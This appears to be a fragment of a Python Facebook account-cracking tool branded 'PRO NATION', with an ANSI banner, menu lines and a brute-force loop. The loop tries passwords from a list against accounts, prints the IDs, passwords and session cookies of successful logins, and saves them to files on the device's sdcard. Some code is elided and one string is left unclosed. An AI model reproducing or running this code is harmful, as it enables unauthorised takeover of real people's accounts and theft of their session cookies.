...
def o():
    ...
    jalan(' \x1b[1;32m[3] \x1b[1;32mPRO NATION TEAM )
    jalan(' \x1b[1;32m[4] \x1b[1;32mJOIN MY FB GROUP ')
...
\033[1;37m================= \33[32;45mPRO NATION\33[0;m =====================
\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mPRO NATION
\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m Yeasien Ahmed
\033[1;32m     \033[1;35mGITHUB       :  \033[1;35m NATIONVK
\033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS FREE
\033[1;32m     \033[1;35mTEAM         :  \033[1;35mNATION TEAM
\033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m2.4
\033[1;37m================= \33[32;45mRN\33[0;m =====================
 
       \33[37;41m\t WELLCOME TO NATION TOOLS\33[0;m
 
\033[1;37m================== \33[32;45mRAIHAN\33[0;m ======================\n""")
loop = 0
oks = []
cps = []
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m(NATION-OKðŸ”¥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/NATION-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(NATION-CPðŸ¤•)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/NATION-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r     %s[NATION] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
